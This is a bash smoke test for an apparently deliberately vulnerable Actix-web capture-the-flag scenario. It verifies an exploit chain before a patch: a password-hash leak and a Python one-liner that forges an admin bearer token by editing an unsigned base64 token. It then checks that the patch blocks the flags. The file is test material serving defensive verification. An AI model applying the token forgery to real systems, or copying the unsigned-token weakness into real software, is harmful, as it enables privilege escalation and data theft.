#!/usr/bin/env bash
# S9/Actix-web VaultGate — pre/post-patch smoke test
#
# Usage:
#   SCRIPT_DIR=$(cd "$(dirname "$0")" && pwd)
#   SCENARIO_DIR=$(dirname "$SCRIPT_DIR")
#   cd "$SCENARIO_DIR"
#   docker build -t vaultgate-s9 .
#   docker run -d --name vaultgate-test \
#     -e FLAG_1=FLAG{11111111111111111111111111111111} \
#     -e FLAG_2=FLAG{22222222222222222222222222222222} \
#     -e FLAG_3=FLAG{33333333333333333333333333333333} \
#     -e FLAG_4=FLAG{44444444444444444444444444444444} \
#     -e FLAG_5=FLAG{55555555555555555555555555555555} \
#     -p 3000:3000 vaultgate-s9
#   bash tests/test_flags.sh
#   docker rm -f vaultgate-test
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCENARIO_DIR="$(dirname "$SCRIPT_DIR")"

BASE_URL="${BASE_URL:-http://localhost:3000}"
ORACLE="${ORACLE:-$SCENARIO_DIR/oracle_exploit.py}"
REFEREE_URL="${REFEREE_URL:-http://localhost:9999}"
MATCH_ID="${MATCH_ID:-test}"
CONTAINER="${CONTAINER:-vaultgate-test}"

echo "[test] Waiting for /health..."
for i in $(seq 1 45); do
  if curl -sf "$BASE_URL/health" | grep -q '"ok"'; then
    echo "[test] App is up."
    break
  fi
  sleep 4
done

echo "[test] Verifying intended unpatched exploit chain for S9..."
READONLY_TOKEN=$(curl -sf -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"readonly","password":"readonly789"}' | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
[ -n "$READONLY_TOKEN" ] || { echo "[FAIL] readonly foothold missing"; exit 1; }

ENGINEER_TOKEN=$(curl -sf -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"engineer","password":"password123"}' | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
[ -n "$ENGINEER_TOKEN" ] || { echo "[FAIL] engineer SLA login missing"; exit 1; }

STATUS=$(curl -s -o /tmp/s9-engineer-private.out -w "%{http_code}" \
  -H "Authorization: Bearer $ENGINEER_TOKEN" \
  "$BASE_URL/api/secrets/private")
[ "$STATUS" = "403" ] || { echo "[FAIL] SLA engineer account should not directly reach flag_3"; exit 1; }

PROFILE=$(curl -sf -H "Authorization: Bearer $READONLY_TOKEN" \
  "$BASE_URL/api/users/profile?username=vaulteng")
echo "$PROFILE" | grep -q '"password_hash"' || { echo "[FAIL] readonly user cannot leak engineer hash"; exit 1; }

FORGED_ADMIN_TOKEN=$(python3 -c 'import base64, json, sys; token = sys.argv[1]; raw = json.loads(base64.urlsafe_b64decode(token + "=" * (-len(token) % 4)).decode()); raw["username"] = "admin"; raw["role"] = "admin"; print(base64.urlsafe_b64encode(json.dumps(raw, separators=(",", ":")).encode()).decode().rstrip("="))' "$READONLY_TOKEN")
STATUS=$(curl -s -o /tmp/s9-vault.out -w "%{http_code}" \
  -H "Authorization: Bearer $FORGED_ADMIN_TOKEN" \
  "$BASE_URL/api/secrets/vault")
[ "$STATUS" = "200" ] || { echo "[FAIL] bearer token should be forgeable pre-patch"; exit 1; }

echo "[test] === Phase 1: unpatched — expecting 5/5 ==="
OUTPUT=$(python3 "$ORACLE" \
  --target-host "${TARGET_HOST:-localhost}" \
  --target-port "${TARGET_PORT:-3000}" \
  --referee-url "$REFEREE_URL" \
  --match-id "$MATCH_ID" \
  --attacker-id 0 \
  --victim-id 1 \
  --budget-seconds 180 2>&1 || true)
echo "$OUTPUT"

CAPTURED=$(echo "$OUTPUT" | python3 -c "
import json, sys
lines = sys.stdin.read()
start = lines.rfind('{\n  \"flags_captured\"')
print(len(json.loads(lines[start:]).get('flags_captured', [])) if start != -1 else 0)
")
[ "$CAPTURED" -eq 5 ] || { echo "[FAIL] Expected 5, got $CAPTURED"; exit 1; }
echo "[PASS] Unpatched: $CAPTURED/5 captured."

echo "[test] Applying oracle_patch.diff..."
docker exec -i "$CONTAINER" bash -c "cd /app && patch -p1" < "$SCENARIO_DIR/oracle_patch.diff"

echo "[test] Restarting app (recompile + restart; Rust build may take a minute)..."
docker exec "$CONTAINER" supervisorctl restart app
sleep 30

echo "[test] Waiting for /health after restart..."
for i in $(seq 1 60); do
  curl -sf "$BASE_URL/health" | grep -q '"ok"' && break || sleep 4
done

# Positive control for the unchanged SLA probe login.
echo "[test] Verifying patched SLA engineer login still works..."
RESP=$(curl -sf -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"engineer","password":"password123"}' || echo "failed")
echo "$RESP" | grep -q '"token"' || { echo "[FAIL] Patched engineer SLA login failed"; exit 1; }
echo "[PASS] Patched engineer SLA login still works."

echo "[test] === Phase 2: patched — expecting 0/5 ==="
OUTPUT=$(python3 "$ORACLE" \
  --target-host "${TARGET_HOST:-localhost}" \
  --target-port "${TARGET_PORT:-3000}" \
  --referee-url "$REFEREE_URL" \
  --match-id "$MATCH_ID" \
  --attacker-id 0 \
  --victim-id 1 \
  --budget-seconds 180 2>&1 || true)
echo "$OUTPUT"

CAPTURED=$(echo "$OUTPUT" | python3 -c "
import json, sys
lines = sys.stdin.read()
start = lines.rfind('{\n  \"flags_captured\"')
print(len(json.loads(lines[start:]).get('flags_captured', [])) if start != -1 else 0)
")
[ "$CAPTURED" -eq 0 ] || { echo "[FAIL] Expected 0, got $CAPTURED"; exit 1; }
echo "[PASS] Patched: $CAPTURED/5 captured."

echo "[test] Verifying /api/debug/config is removed..."
STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/debug/config")
[ "$STATUS" != "200" ] || { echo "[FAIL] /api/debug/config still returns 200 after patch"; exit 1; }
echo "[PASS] /api/debug/config returns $STATUS (not 200)."

echo "[PASS] All tests passed."
